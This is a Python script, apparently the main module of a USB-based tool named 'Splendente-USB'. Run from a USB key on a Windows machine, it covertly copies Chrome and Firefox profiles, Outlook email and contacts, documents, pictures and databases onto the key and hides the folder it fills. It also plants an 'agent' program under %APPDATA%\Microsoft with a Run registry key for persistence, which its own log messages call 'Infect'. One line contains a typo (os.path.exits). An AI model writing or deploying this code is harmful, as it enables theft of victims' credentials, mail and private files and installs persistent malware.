 # -*- coding: utf-8 -*-

"""


 .d8888b.           888                        888                   888                   888     888  .d8888b.  888888b.   
d88P  Y88b          888                        888                   888                   888     888 d88P  Y88b 888  "88b  
Y88b.               888                        888                   888                   888     888 Y88b.      888  .88P  
 "Y888b.   88888b.  888  .d88b.  88888b.   .d88888  .d88b.  88888b.  888888 .d88b.         888     888  "Y888b.   8888888K.  
    "Y88b. 888 "88b 888 d8P  Y8b 888 "88b d88" 888 d8P  Y8b 888 "88b 888   d8P  Y8b        888     888     "Y88b. 888  "Y88b 
      "888 888  888 888 88888888 888  888 888  888 88888888 888  888 888   88888888 888888 888     888       "888 888    888 
Y88b  d88P 888 d88P 888 Y8b.     888  888 Y88b 888 Y8b.     888  888 Y88b. Y8b.            Y88b. .d88P Y88b  d88P 888   d88P 
 "Y8888P"  88888P"  888  "Y8888  888  888  "Y88888  "Y8888  888  888  "Y888 "Y8888          "Y88888P"   "Y8888P"  8888888P"  
           888                                                                                                               
           888                                                                                                               
           888                                                                                                                

"""

#---------------------------------------------------------- [Lib] -----------------------------------------------------------#

import win32api
import win32con
import os
import logging
import re
import glob
import shutil
import sys

from core.splendenteDirs import Directories
from core.splendenteConf import Conf
from core.splendenteUtils import Date, SmallSize, MediumSize, HighSize, BigSize
from core.splendenteMount import TargetMount, UsbMount
from core.splendenteCopy import Copy
from core.splendentePersistence import Persistence

#--------------------------------------------------------- [Global] ---------------------------------------------------------#

SEARCH_USB_MOUNT_LETTER = UsbMount.SearchUsbMountLetter()
PLATFORM = sys.platform

#---------------------------------------------------------- [Main] ----------------------------------------------------------#

def main():
    if PLATFORM == "win32":
        # -- Check if your USB key (USB_DATA) is mounted -- #
        if SEARCH_USB_MOUNT_LETTER != None:

            # -- Check if log file is available on USB key -- #
            if os.path.exists("{0}\\log\\splendente.log".format(SEARCH_USB_MOUNT_LETTER)) == True:

                # -- Define log file -- #
                logFile = "{0}\\log\\splendente.log".format(SEARCH_USB_MOUNT_LETTER)
                logging.basicConfig(
                                    filename=logFile,
                                    level=logging.DEBUG,
                                    format="%(name)s - %(levelname)s -> %(message)s"
                                    )

                # -- Delete old data in log file on USB key --#
                open(logFile, "w").close()
                if os.path.getsize(logFile) == 0:
                    logging.info("Clear : Old {0} -> deleted".format(logFile))

                # -- Check if conf file is available on USB key -- #
                if os.path.exists(SEARCH_USB_MOUNT_LETTER + "\\conf" + "\\splendente.ini") == True:
                    confUsbDirectory = SEARCH_USB_MOUNT_LETTER + "\\conf" + "\\splendente.ini"

                    # --- Name of folder that will contain all data in USB key --- #
                    dataUsbDirectory = "{0}\\data_{1}".format(SEARCH_USB_MOUNT_LETTER, Date())
                    os.makedirs(dataUsbDirectory)

                    # -- Check if data folder is available on USB key -- #    
                    if os.path.exits(dataUsbDirectory) == True:

                        # --- Found directories on target --- #
                        directoriesFound = Directories.Search(Conf.Directories(confUsbDirectory),"Target",TargetMount.SearchPartitionsMount(), UsbMount.SearchPartitionsMount())
                        for i in directoriesFound:
                            if i != None:
                                logging.info("Found : {0}".format(i))
                            else:
                                continue

                        # --- Create folders in USB that will found on target --- #
                        usbDirectories = Directories.Search(Conf.Directories(confUsbDirectory),"USB", TargetMount.SearchPartitionsMount(), UsbMount.SearchPartitionsMount())
                        for i in usbDirectories:
                            if i != None:
                                os.makedirs("{0}\\{1}".format(dataUsbDirectory, i))
                            else:
                                continue

                        # --- Check if agent directory is available on USB key --- #
                        if os.path.exists("{0}\\agent".format(SEARCH_USB_MOUNT_LETTER)) == True:

                            # --- Files copy from USB key --- #
                            agentUsbDirectory = "{0}\\agent".format(SEARCH_USB_MOUNT_LETTER)
                            try:
                                infectTarget = Persistence(agentUsbDirectory)

                                if infectTarget == 1:
                                    logging.info("Infect : Not file in {0} / Error when copying".format(agentUsbDirectory))
                                else:
                                    logging.info("Infect : File upload from  {0} to {1} -> successful".format(agentUsbDirectory, os.environ["APPDATA"] + "\\Microsoft"))
                                    logging.info("Infect : Add Register {0}\\'program_copied' pointed to {1}\\'program_copied' from {2} -> successfull".format("HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", os.environ["APPDATA"] + "\\Microsoft", agentUsbDirectory))
                            
                            except Exception as e:
                                logging.error(e)
                                pass
                        else:
                            logging.info("No {0}\\agent directory".format(SEARCH_USB_MOUNT_LETTER))

                        # -- Files copy from target -- #
                        for usbFolder in usbDirectories:
                            for targetPath in directoriesFound:

                                # -- Folders of user profile and other partitions mounted -- #
                                if usbFolder in targetPath:
                                    usbFolderFound = dataUsbDirectory + "\\" + usbFolder

                                    if re.match(r"(^Chrome$)", usbFolder):
                                        Copy.MediumDepth(Conf.ChromeBrowser(confUsbDirectory), usbFolderFound, targetPath, BigSize())

                                    elif re.match(r"(^Firefox$)", usbFolder):
                                        Copy.MediumDepth(Conf.FirefoxBrowser(confUsbDirectory), usbFolderFound, targetPath, BigSize())

                                    elif re.match(r"(^Outlook$)|(^Contacts$)", usbFolder):
                                        Copy.MediumDepth(Conf.Emails(confUsbDirectory), usbFolderFound, targetPath, MediumSize())

                                    elif re.match(r"(^Pictures$)", usbFolder):
                                        Copy.HighDepth(Conf.Pictures(confUsbDirectory), usbFolderFound, targetPath, MediumSize())

                                    elif re.match(r"(^Documents$)|(^Downloads$)|(^Desktop$)|(^Dropbox$)|(^OneDrive$)", usbFolder):
                                        Copy.HighDepth(Conf.Docs(confUsbDirectory), usbFolderFound, targetPath, HighSize())
                                        Copy.HighDepth(Conf.Pictures(confUsbDirectory), usbFolderFound, targetPath, MediumSize())
                                        Copy.HighDepth(Conf.Compress(confUsbDirectory), usbFolderFound, targetPath, MediumSize())
                                        Copy.HighDepth(Conf.Databases(confUsbDirectory), usbFolderFound, targetPath, BigSize())

                                    elif re.match(r"^\D?$", usbFolder) and os.environ["USERPROFILE"] not in targetPath:
                                        Copy.HighDepth(Conf.Docs(confUsbDirectory), usbFolderFound, targetPath, HighSize())
                                        Copy.HighDepth(Conf.Pictures(confUsbDirectory), usbFolderFound, targetPath, MediumSize())
                                        Copy.HighDepth(Conf.Compress(confUsbDirectory), usbFolderFound, targetPath, MediumSize())
                                        Copy.HighDepth(Conf.Databases(confUsbDirectory), usbFolderFound, targetPath, BigSize())
                                        Copy.HighDepth(Conf.Pictures(confUsbDirectory), usbFolderFound, targetPath, MediumSize())

                                    else:
                                        continue

                                    if glob.glob("{0}\\*.*".format(usbFolderFound)) != []:
                                        logging.info("Copy : {0} -> successful".format(usbFolderFound))
                                    else:
                                        # -- Remove folder empty in USB key -- #
                                        try:
                                            shutil.rmtree(usbFolderFound)
                                            if os.path.exists(usbFolderFound) == False:
                                                logging.info("Remove : {0} -> no data".format(usbFolderFound))
                                        except Exception as e:
                                            pass

                                # -- UserProfile Only -- #
                                elif re.match(r"(^WindowsHome$)", usbFolder) and targetPath == os.environ["USERPROFILE"]:
                                    usbFolderFound = dataUsbDirectory + "\\" + usbFolder

                                    Copy.SmallDepth(Conf.Databases(confUsbDirectory), usbFolderFound, targetPath, BigSize())
                                    Copy.SmallDepth(Conf.Programs(confUsbDirectory), usbFolderFound, targetPath, MediumSize())
                                    Copy.SmallDepth(Conf.Docs(confUsbDirectory), usbFolderFound, targetPath, HighSize())
                                    Copy.SmallDepth(Conf.Compress(confUsbDirectory), usbFolderFound, targetPath, HighSize())

                                    if glob.glob("{0}\\*.*".format(usbFolderFound)) != []:
                                        logging.info("Copy : {0} -> successful".format(usbFolderFound))
                                    else:
                                        # -- Remove folder empty in USB key -- #
                                        try:
                                            shutil.rmtree(usbFolderFound)
                                            if os.path.exists(usbFolderFound) == False:
                                                logging.info("Remove : {0} -> no data".format(usbFolderFound))
                                        except Exception as e:
                                            pass
                                else:
                                    continue

                        # -- Set the folder in hidden mode containing the copied files -- #
                        win32api.SetFileAttributes(dataUsbDirectory, win32con.FILE_ATTRIBUTE_HIDDEN)
                        
                    else:
                        logging.error("No {0}\\data directory".format(SEARCH_USB_MOUNT_LETTER))
                else:
                    logging.error("No {0}\\conf\\splendente.ini".format(SEARCH_USB_MOUNT_LETTER))
                    sys.exit(0)
            else:
                sys.exit(0)
        else:
            sys.exit(0)
    else:
        sys.exit(0)

#---------------------------------------------------------------------------------------------------------------------------#

#---------------------------------------------------------------------------------------------------------------------------#

if __name__ == '__main__':
    main()
